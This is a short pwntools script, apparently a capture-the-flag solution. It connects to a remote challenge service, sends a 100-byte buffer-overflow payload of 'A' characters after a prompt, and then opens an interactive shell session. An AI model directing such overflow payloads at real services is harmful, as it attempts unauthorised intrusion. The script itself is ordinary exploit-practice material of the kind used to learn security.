from pwn import *
io = remote("13.37.111.222", "5001")
#io = process("./challenge")

payload = b""
payload += b"A"*100
io.sendlineafter("me!", payload)
io.interactive()
